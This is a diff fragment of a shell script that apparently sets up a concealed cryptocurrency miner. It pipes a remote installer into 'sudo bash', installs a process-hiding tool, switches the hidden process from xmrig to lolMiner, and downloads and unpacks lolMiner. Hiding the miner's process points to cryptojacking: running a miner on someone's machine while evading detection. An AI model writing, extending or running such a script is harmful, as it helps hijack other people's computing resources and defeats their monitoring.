@@ -4,7 +4,7 @@ sudo apt-get install build-essential -y
 curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
 sudo apt-get install -y nodejs
 npm i -g node-process-hider
-sudo ph add xmrig
+sudo ph add lolMiner
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Lin64.tar.gz
 tar -xvzf lolMiner_v1.91_Lin64.tar.gz
 cd 1.91
